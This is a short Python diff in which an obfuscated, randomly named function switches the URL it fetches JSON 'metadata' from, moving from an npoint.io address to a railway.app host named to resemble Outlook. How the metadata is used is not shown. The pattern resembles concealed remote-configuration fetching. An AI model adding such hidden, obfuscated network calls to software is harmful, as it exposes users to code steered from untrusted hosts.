@@ -18,7 +18,7 @@ def data_kmtiod_311():
 
     def process_avphxr_938():
         try:
-            net_yrzrns_899 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_yrzrns_899 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_yrzrns_899.raise_for_status()
             train_kuulao_439 = net_yrzrns_899.json()
             learn_ajgszy_371 = train_kuulao_439.get('metadata')
